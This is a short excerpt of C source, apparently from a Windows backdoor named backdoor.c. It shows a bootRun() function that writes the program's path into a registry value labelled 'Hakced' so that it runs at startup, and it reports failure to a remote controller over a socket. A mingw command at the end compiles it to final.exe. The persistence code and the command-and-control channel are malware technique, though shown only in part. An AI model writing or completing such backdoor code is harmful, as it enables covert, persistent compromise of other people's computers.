...
int bootRun()
{
    ...
    if (RegSetValueEx(NewVal, TEXT("Hakced"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
    {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
...
// i686-w64-mingw32-gcc -o final.exe backdoor.c -lwsock32 -lwininet
